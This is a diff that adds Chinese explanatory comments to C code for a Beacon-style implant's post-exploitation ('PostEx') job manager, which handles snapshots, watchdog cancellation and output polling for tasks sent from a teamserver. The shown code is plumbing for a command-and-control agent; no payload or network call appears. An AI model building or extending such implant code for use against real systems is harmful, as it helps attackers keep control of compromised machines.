@@ -4,6 +4,7 @@ typedef struct PostExPollItem {
     PostExJob job;
 } PostExPollItem;
 
+/* 为 poll 快照复制句柄，避免持锁期间阻塞读取 pipe。 */
 static BOOL PostExDuplicateHandleForPoll(HANDLE src, HANDLE* dst)
 {
     HANDLE self;
@@ -21,6 +22,7 @@ static BOOL PostExDuplicateHandleForPoll(HANDLE src, HANDLE* dst)
     return TRUE;
 }
 
+/* 关闭 poll 快照中复制出来的临时句柄。 */
 static VOID PostExClosePollItem(PostExPollItem* item)
 {
     if (!item) return;
@@ -34,6 +36,7 @@ static VOID PostExClosePollItem(PostExPollItem* item)
     }
 }
 
+/* 对当前 job 列表做轻量快照，poll 阶段只操作复制句柄。 */
 static SIZE_T PostExSnapshotJobs(PostExManager* pm,
                                  PostExPollItem* items,
                                  SIZE_T max_items)
@@ -70,6 +73,7 @@ static SIZE_T PostExSnapshotJobs(PostExManager* pm,
     return count;
 }
 
+/* 从真实 job 列表摘除指定 job，调用方获得所有权。 */
 static PostExJob* PostExDetachForPoll(PostExManager* pm, UINT32 job_id)
 {
     PostExJob* job;
@@ -80,6 +84,7 @@ static PostExJob* PostExDetachForPoll(PostExManager* pm, UINT32 job_id)
     return job;
 }
 
+/* 把真实 job 的取消状态同步到 poll 快照。 */
 static VOID PostExCopyCancelState(PostExJob* dst, const PostExJob* src)
 {
     if (!dst || !src) return;
@@ -88,6 +93,7 @@ static VOID PostExCopyCancelState(PostExJob* dst, const PostExJob* src)
     dst->cancel_requested_tick = src->cancel_requested_tick;
 }
 
+/* 记录 job 活动时间，并刷新快照中的取消状态。 */
 static VOID PostExTouchActivityForPoll(PostExManager* pm,
                                        PostExJob* snapshot,
                                        ULONGLONG now)
@@ -106,6 +112,7 @@ static VOID PostExTouchActivityForPoll(PostExManager* pm,
     LeaveCriticalSection(&pm->lock);
 }
 
+/* 从 poll 路径请求取消真实 job。 */
 static BOOL PostExRequestCancelForPoll(PostExManager* pm,
                                        PostExJob* snapshot,
                                        UINT32 reason,
@@ -127,6 +134,7 @@ static BOOL PostExRequestCancelForPoll(PostExManager* pm,
     return found;
 }
 
+/* 根据 max_runtime/idle_timeout 对 job 应用 watchdog 取消策略。 */
 static VOID PostExApplyWatchdog(PostExManager* pm, PostExJob* job,
                                 ULONGLONG now)
 {
@@ -144,6 +152,7 @@ static VOID PostExApplyWatchdog(PostExManager* pm, PostExJob* job,
     }
 }
 
+/* 判断取消请求是否已经超过宽限期。 */
 static BOOL PostExCancelGraceExpired(const PostExJob* job, ULONGLONG now)
 {
     return job &&
@@ -152,6 +161,7 @@ static BOOL PostExCancelGraceExpired(const PostExJob* job, ULONGLONG now)
            now - job->cancel_requested_tick >= POSTEX_CANCEL_GRACE_MS;
 }
 
+/* 根据取消状态规范化 DONE reason。 */
 static const CHAR* PostExDoneReason(PostExJob* job, const CHAR* done_reason)
 {
     if (job && job->cancel_requested) {
@@ -164,6 +174,7 @@ static const CHAR* PostExDoneReason(PostExJob* job, const CHAR* done_reason)
     return done_reason && done_reason[0] ? done_reason : "done";
 }
 
+/* 根据取消状态规范化 pipe/process 关闭原因。 */
 static const CHAR* PostExClosedReason(PostExJob* job, const CHAR* fallback)
 {
     if (job && job->cancel_requested) {
@@ -172,6 +183,7 @@ static const CHAR* PostExClosedReason(PostExJob* job, const CHAR* fallback)
     return fallback && fallback[0] ? fallback : "pipe closed";
 }
 
+/* 取消宽限期结束后关闭 job，并生成 dead 事件。 */
 static BOOL PostExCloseCancelledForPoll(PostExManager* pm,
                                         PostExJob* snapshot,
                                         PacketList* out)
@@ -189,6 +201,7 @@ static BOOL PostExCloseCancelledForPoll(PostExManager* pm,
     return TRUE;
 }
 
+/* 初始化 PostEx 管理器。 */
 VOID PostExInit(PostExManager* pm, struct BeaconContext* ctx)
 {
     InitializeCriticalSection(&pm->lock);
@@ -196,6 +209,7 @@ VOID PostExInit(PostExManager* pm, struct BeaconContext* ctx)
     pm->ctx = ctx;
 }
 
+/* 关闭并释放所有 PostEx job。 */
 VOID PostExFree(PostExManager* pm)
 {
     PostExJob* cur;
@@ -218,6 +232,7 @@ VOID PostExFree(PostExManager* pm)
     ZeroMemory(pm, sizeof(*pm));
 }
 
+/* 处理 teamserver 下发的 PostEx 子命令。 */
 ByteBuf PostExHandle(struct BeaconContext* ctx, UINT32 task_id, Parser* parser)
 {
     if (!ctx || !parser) return BbFromText("invalid context");
@@ -235,6 +250,7 @@ ByteBuf PostExHandle(struct BeaconContext* ctx, UINT32 task_id, Parser* parser)
     return BbFromText("unknown postex subcommand");
 }
 
+/* 轮询所有 PostEx job，读取输出、frame、结束和取消状态。 */
 PacketList PostExPoll(PostExManager* pm)
 {
     PacketList out;
@@ -248,6 +264,7 @@ PacketList PostExPoll(PostExManager* pm)
     out.items_are_final = 1;
     if (!pm) return out;
 
+    /* 快照后无锁 poll，避免长时间持有 jobs lock。 */
     item_count = PostExSnapshotJobs(pm, items, _countof(items));
     for (i = 0; i < item_count; ++i) {
         PostExPollItem* item = &items[i];
@@ -255,6 +272,7 @@ PacketList PostExPoll(PostExManager* pm)
         BOOL job_closed = FALSE;
         ULONGLONG now_tick = GetTickCount64();
 
+        /* 每轮先执行运行时长和 idle watchdog。 */
         PostExApplyWatchdog(pm, &item->job, now_tick);
 
         while (!job_closed &&
@@ -272,6 +290,7 @@ PacketList PostExPoll(PostExManager* pm)
                                   sizeof(done_reason), &frame_type,
                                   &frame_flags, &frame_seq);
 
+            /* 普通文本输出直接变为 POSTEX_EVENT_OUTPUT。 */
             if (rc == POSTEX_READ_OUTPUT) {
                 tick_bytes += data.len;
                 ++tick_frames;
@@ -284,6 +303,7 @@ PacketList PostExPoll(PostExManager* pm)
                 continue;
             }
 
+            /* 结构化 frame 保留类型、标志和序号。 */
             if (rc == POSTEX_READ_FRAME) {
                 tick_bytes += data.len;
                 ++tick_frames;
@@ -298,6 +318,7 @@ PacketList PostExPoll(PostExManager* pm)
                 continue;
             }
 
+            /* DONE 或 pipe/process 关闭都会摘除真实 job。 */
             if (rc == POSTEX_READ_DONE) {
                 PostExJob* dead;
 
